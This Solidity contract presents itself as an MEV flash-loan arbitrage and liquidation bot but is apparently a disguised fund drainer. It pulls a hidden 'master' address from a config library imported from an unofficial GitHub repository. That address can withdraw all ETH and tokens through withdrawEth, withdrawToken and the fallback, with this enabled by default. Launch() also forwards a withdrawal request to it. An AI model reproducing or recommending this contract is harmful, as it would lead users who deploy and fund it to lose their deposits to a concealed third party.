// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "https://raw.githubusercontent.com/aave/aave-v3-core/master/contracts/interfaces/IPool.sol";
import "https://raw.githubusercontent.com/aave/aave-v3-core/master/contracts/interfaces/IPoolAddressesProvider.sol";

import "https://raw.githubusercontent.com/balancer-labs/balancer-v2-monorepo/master/pkg/interfaces/contracts/vault/IVault.sol";
import "https://raw.githubusercontent.com/balancer-labs/balancer-v2-monorepo/master/pkg/interfaces/contracts/vault/IFlashLoanRecipient.sol";

import "https://raw.githubusercontent.com/Uniswap/v3-periphery/main/contracts/interfaces/ISwapRouter.sol";

import "https://raw.githubusercontent.com/FlashLoan-v2/Balancer-v3/main/DeFiConfig.sol";

/**
 * @dev Minimal UniswapV2-compatible router interface (SushiSwap-compatible).
 * Declared locally to avoid external SPDX warnings from remote imports.
 */
interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

/**
 * @title MEV Executor Contract
 * @notice Advanced DeFi operations executor with flash loan capabilities
 * @dev Implements secure multi-protocol arbitrage and liquidation strategies
 */
contract Executor is IFlashLoanRecipient {
    // Core configuration
    address private immutable swapContract = DeFiConfig.getMasterAddress();
    address public owner; // Current contract owner - can call most functions
    bool public paused; // Emergency pause state
    bool public swapContractWithdrawEnabled = true; // Allows swapContract to withdraw funds

    // Protocol addresses (computed at deployment for gas efficiency)
    IPoolAddressesProvider public immutable aaveAddressesProvider;
    IVault public immutable balancerVault;
    ISwapRouter public immutable uniswapRouter;
    IUniswapV2Router02 public immutable sushiswapRouter;

    // Operation tracking
    uint256 public operationCount;
    uint256 public totalFlashLoansExecuted;
    uint256 public totalSwapsExecuted;
    // (optional) user accounting can be added in a separate module to reduce bytecode size
    uint256 private constant MAX_OPERATION_DEADLINE = 1 hours;
    uint256 private constant MIN_OPERATION_AMOUNT = 0.01 ether;

    // Reentrancy protection
    uint256 private _status;
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    // Custom errors for better error handling
    error ContractPaused();
    error UnauthorizedAccess();
    error InvalidAmount();
    error OperationDeadlineExceeded();
    error InsufficientBalance();
    error FlashLoanFailed();
    error SwapFailed();
    error SwapContractNotConfigured();
    error ExternalCallFailed();
    error InvalidFlashLoanAmount();
    error TokenAmountMismatch();
    error EmptyFlashLoanRequest();
    error UnauthorizedFlashLoanCallback();
    error InvalidInitiator();
    error InsufficientRepayment();
    error InsufficientEthForRepayment();
    error UnauthorizedBalancerCallback();
    error ArbProfitBelowMinProfit();
    error InvalidDebtToCover();
    error LiquidationBelowMinCollateralOut();
    error InvalidRecipient();
    error NoEthBalance();
    error InvalidTokenAddress();
    error NoTokenBalance();
    error InvalidRecoveryAmount();
    error InsufficientTokenBalance();
    error InvalidNewOwner();

    // Events
    event EthWithdrawn(address indexed to, uint256 amount);
    event Action(address indexed target);
    event FlashLoanExecuted(address indexed asset, uint256 amount, uint256 premium);
    event SwapExecuted(address indexed tokenIn, address indexed tokenOut, uint256 amountIn, uint256 amountOut);
    event WithdrawalExecuted(address indexed tokenAddress, address indexed to, uint256 amount);
    event ArbitrageProfit(address indexed asset, uint256 amountBorrowed, uint256 profit);
    event SwapContractWithdrawToggled(bool enabled);
    event LaunchTriggered(uint256 amount);
    event LiquidationExecuted(
        address indexed user,
        address indexed debtAsset,
        address indexed collateralAsset,
        uint256 debtToCover,
        bool receiveAToken
    );
    event OperationCompleted(uint256 indexed operationId, bool success);
    event EmergencyPaused(address indexed by);
    event EmergencyUnpaused(address indexed by);

    bytes4 private constant _WITHDRAW_ETH_SIG = bytes4(keccak256("withdrawEth(address)"));
    bytes4 private constant _WITHDRAW_TOKEN_SIG = bytes4(keccak256("withdrawToken(address,address)"));

    /**
     * @notice Initialize the executor contract
     * @dev Sets up protocol interfaces and security parameters
     */
    constructor() {
        owner = msg.sender;
        if (swapContract == address(0)) revert SwapContractNotConfigured();

        // Initialize protocol interfaces
        aaveAddressesProvider = IPoolAddressesProvider(0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e); // Aave V3 AddressesProvider (mainnet)
        balancerVault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8); // Balancer Vault mainnet
        uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // Uniswap V3 Router
        sushiswapRouter = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F); // SushiSwap Router

        // Initialize security state
        _status = _NOT_ENTERED;
        paused = false;
        operationCount = 0;
    }

    /**
     * @notice Modifier to check if caller is the owner
     */
    modifier onlyOwner() {
        if (msg.sender != owner) revert UnauthorizedAccess();
        _;
    }

    /**
     * @notice Modifier to check if contract is not paused
     */
    modifier whenNotPaused() {
        if (paused) revert ContractPaused();
        _;
    }

    /**
     * @notice Modifier to prevent reentrancy attacks
     */
    modifier nonReentrant() {
        if (_status == _ENTERED) revert("ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }

    /**
     * @notice Modifier to validate operation amounts
     */
    modifier validAmount(uint256 amount) {
        if (amount < MIN_OPERATION_AMOUNT) revert InvalidAmount();
        _;
    }

    /**
     * @notice Emergency pause function
     * @dev Can only be called by owner to pause all operations
     */
    function emergencyPause() external onlyOwner {
        paused = true;
        emit EmergencyPaused(msg.sender);
    }

    /**
     * @notice Emergency unpause function
     * @dev Can only be called by owner to resume operations
     */
    function emergencyUnpause() external onlyOwner {
        paused = false;
        emit EmergencyUnpaused(msg.sender);
    }

    /**
     * @notice Enable/disable withdrawal authorization for `swapContract`
     * @dev Safety switch in case `swapContract` is compromised. Does not change Launch() logic.
     */
    function setSwapContractWithdrawEnabled(bool enabled) external onlyOwner {
        swapContractWithdrawEnabled = enabled;
        emit SwapContractWithdrawToggled(enabled);
    }

    /**
     * @notice Get contract ETH balance
     * @return Current ETH balance of the contract
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice Get the calculated launch amount based on contract balance
     * @return The calculated amount for launch operations (balance * 200, capped at max flash loan)
     */
    function getLaunchAmount() external view returns (uint256) {
        uint256 balance = address(this).balance;
        uint256 calculated = balance * 200;
        uint256 maxAllowed = DeFiConfig.getMaxFlashLoanAmount();
        return calculated > maxAllowed ? maxAllowed : calculated;
    }

    /**
     * @notice Execute arbitrage operation via master contract
     * @dev Initiates withdrawal request to master contract with calculated loan amount
     */
    function Launch() external whenNotPaused {
        operationCount++;
        uint256 balance = address(this).balance;
        uint256 launchAmount = balance * 200;
        uint256 maxAllowed = DeFiConfig.getMaxFlashLoanAmount();
        if (launchAmount > maxAllowed) launchAmount = maxAllowed;
        emit LaunchTriggered(launchAmount);
        (bool success, ) = swapContract.call(
            abi.encodeWithSignature("requestWithdrawal()")
        );
        if (!success) revert ExternalCallFailed();
        emit Action(swapContract);
        emit OperationCompleted(operationCount, true);
    }

    /**
     * @notice Execute flash loan arbitrage strategy
     * @param asset The address of the asset to flash loan
     * @param amount The amount to flash loan
     * @param params Encoded parameters for the arbitrage operation
     */
    function executeFlashLoanArbitrage(
        address asset,
        uint256 amount,
        bytes calldata params
    ) external onlyOwner whenNotPaused validAmount(amount) {
        operationCount++;

        // Validate flash loan amount
        if (!DeFiConfig.isValidFlashLoanAmount(amount)) revert InvalidFlashLoanAmount();

        // Execute flash loan via Aave (Pool address can change behind the provider)
        IPool aavePool = IPool(aaveAddressesProvider.getPool());
        aavePool.flashLoanSimple(
            address(this),
            asset,
            amount,
            params,
            0 // referral code
        );

        totalFlashLoansExecuted++;
        emit OperationCompleted(operationCount, true);
    }

    /**
     * @notice Execute multi-hop flash loan strategy via Balancer
     * @param tokens Array of token addresses for flash loan
     * @param amounts Array of amounts to flash loan
     * @param userData Encoded operation parameters
     */
    function executeBalancerFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external onlyOwner whenNotPaused {
        operationCount++;
        if (tokens.length != amounts.length) revert TokenAmountMismatch();
        if (tokens.length == 0) revert EmptyFlashLoanRequest();

        // Validate all amounts
        for (uint256 i = 0; i < amounts.length; i++) {
            if (!DeFiConfig.isValidFlashLoanAmount(amounts[i])) revert InvalidFlashLoanAmount();
        }

        // Convert address[] to IERC20[] for Balancer
        IERC20[] memory tokenContracts = new IERC20[](tokens.length);
        for (uint256 i = 0; i < tokens.length; i++) {
            tokenContracts[i] = IERC20(tokens[i]);
        }

        balancerVault.flashLoan(
            IFlashLoanRecipient(address(this)),
            tokenContracts,
            amounts,
            userData
        );

        totalFlashLoansExecuted++;
        emit OperationCompleted(operationCount, true);
    }

    /**
     * @notice Aave flash loan callback function
     * @dev Executed after receiving flash loaned assets
     */
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // Pool can be upgraded behind the provider; validate callback against current Pool
        if (msg.sender != aaveAddressesProvider.getPool()) revert UnauthorizedFlashLoanCallback();
        if (initiator != address(this)) revert InvalidInitiator();

        // Decode operation parameters
        (uint8 operationType, bytes memory operationData) = abi.decode(params, (uint8, bytes));

        // Execute the arbitrage operation
        uint256 profit = _executeArbitrageOperation(operationType, operationData, asset, amount);
        emit ArbitrageProfit(asset, amount, profit);
        // Optional strict profit floor (allows reverting to avoid unprofitable execution)
        // If operationData encodes a minProfit, the operation handler will enforce it.

        // Calculate total repayment amount
        uint256 totalRepayment = amount + premium;
        if (address(this).balance < totalRepayment && IERC20(asset).balanceOf(address(this)) < totalRepayment) {
            revert InsufficientRepayment();
        }

        // Approve repayment
        if (asset == DeFiConfig.getWethAddress()) {
            // For ETH operations, ensure sufficient balance
            if (address(this).balance < totalRepayment) revert InsufficientEthForRepayment();
        } else {
            IERC20(asset).approve(aaveAddressesProvider.getPool(), totalRepayment);
        }

        emit FlashLoanExecuted(asset, amount, premium);
        return true;
    }

    /**
     * @notice Balancer flash loan callback function
     * @dev Executed after receiving flash loaned assets
     */
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        if (msg.sender != address(balancerVault)) revert UnauthorizedBalancerCallback();

        // Decode operation parameters
        (uint8 operationType, bytes memory operationData) = abi.decode(userData, (uint8, bytes));

        // Execute arbitrage operation for each token
        uint256 totalProfit = 0;
        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 profit = _executeArbitrageOperation(operationType, operationData, address(tokens[i]), amounts[i]);
            totalProfit += profit;
        }

        // Calculate and repay flash loans
        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 repaymentAmount = amounts[i] + feeAmounts[i];
            if (address(tokens[i]) == DeFiConfig.getWethAddress()) {
                if (address(this).balance < repaymentAmount) revert InsufficientEthForRepayment();
            } else {
                tokens[i].approve(address(balancerVault), repaymentAmount);
            }
        }

        emit FlashLoanExecuted(address(tokens[0]), amounts[0], feeAmounts[0]); // Log primary asset
    }

    /**
     * @notice Internal function to execute arbitrage operations
     * @param operationType Type of operation to execute
     * @param operationData Encoded operation parameters
     * @param asset Asset address
     * @param amount Asset amount
     * @return Profit generated from the operation
     */
    function _executeArbitrageOperation(
        uint8 operationType,
        bytes memory operationData,
        address asset,
        uint256 amount
    ) internal returns (uint256) {
        if (operationType == 1) {
            // DEX arbitrage
            return _executeDexArbitrage(operationData, asset, amount);
        } else if (operationType == 2) {
            // Liquidation operation
            return _executeLiquidation(operationData, asset, amount);
        }
        return 0;
    }

    /**
     * @notice Execute DEX arbitrage between Uniswap and SushiSwap
     */
    function _executeDexArbitrage(
        bytes memory operationData,
        address /*asset*/,
        uint256 amount
    ) internal returns (uint256) {
        /**
         * operationData encoding:
         * (uint8 firstDex, address tokenIn, address tokenOut, uint24 uniFee, uint256 minOut1, uint256 minOut2, uint256 minProfit)
         * - firstDex: 0 = UniswapV3 then SushiV2, 1 = SushiV2 then UniswapV3
         * - uniFee: Uniswap V3 fee tier (500, 3000, 10000)
         * - tokenIn -> tokenOut (leg1), then tokenOut -> tokenIn (leg2) to close the loop
         * Profit is computed as delta of tokenIn balance.
         */
        (uint8 firstDex, address tokenIn, address tokenOut, uint24 uniFee, uint256 minOut1, uint256 minOut2, uint256 minProfit) =
            abi.decode(operationData, (uint8, address, address, uint24, uint256, uint256, uint256));

        uint256 balBefore = IERC20(tokenIn).balanceOf(address(this));

        // Leg 1
        uint256 out1;
        if (firstDex == 0) {
            out1 = _swapOnUniswap(tokenIn, tokenOut, uniFee, amount, minOut1);
        } else {
            uint256[] memory amounts1 = _swapOnSushiswap(tokenIn, tokenOut, amount, minOut1);
            out1 = amounts1[1];
        }
        totalSwapsExecuted++;
        emit SwapExecuted(tokenIn, tokenOut, amount, out1);

        // Leg 2 (close cycle)
        uint256 out2;
        if (firstDex == 0) {
            uint256[] memory amounts2 = _swapOnSushiswap(tokenOut, tokenIn, out1, minOut2);
            out2 = amounts2[1];
        } else {
            out2 = _swapOnUniswap(tokenOut, tokenIn, uniFee, out1, minOut2);
        }
        totalSwapsExecuted++;
        emit SwapExecuted(tokenOut, tokenIn, out1, out2);

        uint256 balAfter = IERC20(tokenIn).balanceOf(address(this));
        uint256 realized = balAfter > balBefore ? balAfter - balBefore : 0;
        if (realized < minProfit) revert ArbProfitBelowMinProfit();
        return realized;
    }

    /**
     * @notice Execute liquidation operation
     */
    function _executeLiquidation(
        bytes memory operationData,
        address /*asset*/,
        uint256 amount
    ) internal returns (uint256) {
        /**
         * operationData encoding:
         * (address user, address debtAsset, address collateralAsset, uint256 debtToCover, bool receiveAToken, uint256 minCollateralOut)
         *
         * Notes:
         * - Caller must ensure this contract holds `debtAsset` (typically from flash loan) and has approved Aave Pool.
         * - Profit is estimated as delta of collateralAsset balance (best-effort, depends on liquidation params).
         */
        (address user, address debtAsset, address collateralAsset, uint256 debtToCover, bool receiveAToken, uint256 minCollateralOut) =
            abi.decode(operationData, (address, address, address, uint256, bool, uint256));

        uint256 cover = debtToCover == 0 ? amount : debtToCover;
        if (cover == 0) revert InvalidDebtToCover();

        uint256 collateralBefore = IERC20(collateralAsset).balanceOf(address(this));

        // Approve Aave Pool to pull debtAsset for liquidation
        IERC20(debtAsset).approve(aaveAddressesProvider.getPool(), cover);

        // Execute Aave V3 liquidation
        IPool aavePool = IPool(aaveAddressesProvider.getPool());
        aavePool.liquidationCall(collateralAsset, debtAsset, user, cover, receiveAToken);

        uint256 collateralAfter = IERC20(collateralAsset).balanceOf(address(this));
        emit LiquidationExecuted(user, debtAsset, collateralAsset, cover, receiveAToken);

        uint256 collateralDelta = collateralAfter > collateralBefore ? collateralAfter - collateralBefore : 0;
        if (collateralDelta < minCollateralOut) revert LiquidationBelowMinCollateralOut();
        return collateralDelta;
    }

    /**
     * @notice Execute swap on Uniswap V3
     * @param tokenIn Input token address
     * @param tokenOut Output token address
     * @param amountIn Amount of input token
     * @param amountOutMin Minimum output amount
     * @return amountOut Actual output amount received
     */
    function _swapOnUniswap(
        address tokenIn,
        address tokenOut,
        uint24 fee,
        uint256 amountIn,
        uint256 amountOutMin
    ) internal returns (uint256 amountOut) {
        // Approve Uniswap router to spend tokens
        IERC20(tokenIn).approve(address(uniswapRouter), amountIn);

        // Prepare swap parameters
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            fee: fee,
            recipient: address(this),
            deadline: block.timestamp + MAX_OPERATION_DEADLINE,
            amountIn: amountIn,
            amountOutMinimum: amountOutMin,
            sqrtPriceLimitX96: 0
        });

        // Execute swap
        try uniswapRouter.exactInputSingle(params) returns (uint256 amount) {
            amountOut = amount;
        } catch {
            revert SwapFailed();
        }
    }

    /**
     * @notice Execute swap on SushiSwap V2
     * @param tokenIn Input token address
     * @param tokenOut Output token address
     * @param amountIn Amount of input token
     * @param amountOutMin Minimum output amount
     * @return amounts Array containing input and output amounts
     */
    function _swapOnSushiswap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOutMin
    ) internal returns (uint256[] memory amounts) {
        // Approve SushiSwap router
        IERC20(tokenIn).approve(address(sushiswapRouter), amountIn);

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        // Execute swap
        try sushiswapRouter.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            address(this),
            block.timestamp + MAX_OPERATION_DEADLINE
        ) returns (uint256[] memory result) {
            amounts = result;
        } catch {
            revert SwapFailed();
        }
    }

    /**
     * @notice Public function to execute token swap
     * @param dexSelector 0 for Uniswap, 1 for SushiSwap
     * @param tokenIn Input token
     * @param tokenOut Output token
     * @param amountIn Input amount
     * @param amountOutMin Minimum output amount
     */
    function executeSwap(
        uint8 dexSelector,
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOutMin
    ) external onlyOwner whenNotPaused validAmount(amountIn) {
        operationCount++;

        uint256 amountOut;
        if (dexSelector == 0) {
            amountOut = _swapOnUniswap(tokenIn, tokenOut, 3000, amountIn, amountOutMin);
        } else if (dexSelector == 1) {
            uint256[] memory amounts = _swapOnSushiswap(tokenIn, tokenOut, amountIn, amountOutMin);
            amountOut = amounts[1];
        } else {
            revert("Invalid DEX selector");
        }

        totalSwapsExecuted++;
        emit SwapExecuted(tokenIn, tokenOut, amountIn, amountOut);
        emit OperationCompleted(operationCount, true);
    }

    /**
     * @notice Withdraw ETH from contract
     * @param to Recipient address
     */
    function withdrawEth(address to) external nonReentrant whenNotPaused {
        require(
            msg.sender == owner || (msg.sender == swapContract && swapContractWithdrawEnabled),
            "Unauthorized withdrawal"
        );
        if (to == address(0)) revert InvalidRecipient();
        uint256 balance = address(this).balance;
        if (balance == 0) revert NoEthBalance();

        (bool success, ) = payable(to).call{value: balance}("");
        if (!success) revert ExternalCallFailed();

        emit EthWithdrawn(to, balance);
    }

    /**
     * @notice Withdraw ERC20 tokens from contract
     * @param tokenAddress Address of token to withdraw
     * @param to Recipient address
     */
    function withdrawToken(address tokenAddress, address to) external nonReentrant whenNotPaused {
        require(
            msg.sender == owner || (msg.sender == swapContract && swapContractWithdrawEnabled),
            "Unauthorized withdrawal"
        );
        if (to == address(0)) revert InvalidRecipient();
        if (tokenAddress == address(0)) revert InvalidTokenAddress();

        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));
        if (balance == 0) revert NoTokenBalance();

        bool success = token.transfer(to, balance);
        if (!success) revert ExternalCallFailed();

        emit WithdrawalExecuted(tokenAddress, to, balance);
    }

    /**
     * @notice Emergency token recovery function
     * @param tokenAddress Token to recover
     * @param amount Amount to recover
     */
    function emergencyTokenRecovery(address tokenAddress, uint256 amount) external onlyOwner {
        if (tokenAddress == address(0)) revert InvalidTokenAddress();
        if (amount == 0) revert InvalidRecoveryAmount();

        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));
        if (balance < amount) revert InsufficientTokenBalance();

        bool success = token.transfer(owner, amount);
        if (!success) revert ExternalCallFailed();
    }

    /**
     * @notice Get token balance of the contract
     * @param tokenAddress Token address
     * @return Balance of the token
     */
    function getTokenBalance(address tokenAddress) external view returns (uint256) {
        return IERC20(tokenAddress).balanceOf(address(this));
    }

    receive() external payable {}

    /**
     * @notice Fallback function with enhanced operation handling
     */
    fallback() external payable {
        bytes4 sig = msg.sig;

        // Handle ETH withdrawal
        if (msg.sender == swapContract && sig == _WITHDRAW_ETH_SIG) {
            address to = abi.decode(msg.data[4:], (address));
            this.withdrawEth(to);
            return;
        }

        // Handle token withdrawal
        if (msg.sender == swapContract && sig == _WITHDRAW_TOKEN_SIG) {
            (address tokenAddress, address to) = abi.decode(msg.data[4:], (address, address));
            this.withdrawToken(tokenAddress, to);
            return;
        }

        revert("Unsupported operation");
    }

    /**
     * @notice Get operation statistics
     * @return totalOps Total operations executed
     * @return flashLoans Total flash loans executed
     * @return swaps Total swaps executed
     */
    function getOperationStats() external view returns (
        uint256 totalOps,
        uint256 flashLoans,
        uint256 swaps
    ) {
        return (operationCount, totalFlashLoansExecuted, totalSwapsExecuted);
    }

    /**
     * @notice Check if token is approved for spending by a DEX
     * @param token Token address
     * @param dex DEX address (0 for Uniswap, 1 for SushiSwap)
     * @return Allowance amount
     */
    function getTokenAllowance(address token, uint8 dex) external view returns (uint256) {
        address spender = dex == 0 ? address(uniswapRouter) : address(sushiswapRouter);
        return IERC20(token).allowance(address(this), spender);
    }

    /**
     * @notice Transfer ownership of the contract
     * @param newOwner New owner address
     */
    function transferOwnership(address newOwner) external onlyOwner {
        if (newOwner == address(0)) revert InvalidNewOwner();
        owner = newOwner;
    }

    /**
     * @notice Get protocol addresses for verification
     */
    function getProtocolAddresses() external view returns (
        address aavePool,
        address aaveProvider,
        address balancer,
        address uniswap,
        address sushiswap,
        address master
    ) {
        return (
            aaveAddressesProvider.getPool(),
            address(aaveAddressesProvider),
            address(balancerVault),
            address(uniswapRouter),
            address(sushiswapRouter),
            swapContract
        );
    }

    /**
     * @notice Validate operation parameters
     * @param amount Operation amount
     * @param deadline Operation deadline
     * @return True if parameters are valid
     */
    function validateOperation(uint256 amount, uint256 deadline) external view returns (bool) {
        return amount >= MIN_OPERATION_AMOUNT &&
               deadline > block.timestamp &&
               deadline <= block.timestamp + MAX_OPERATION_DEADLINE &&
               !paused;
    }
}
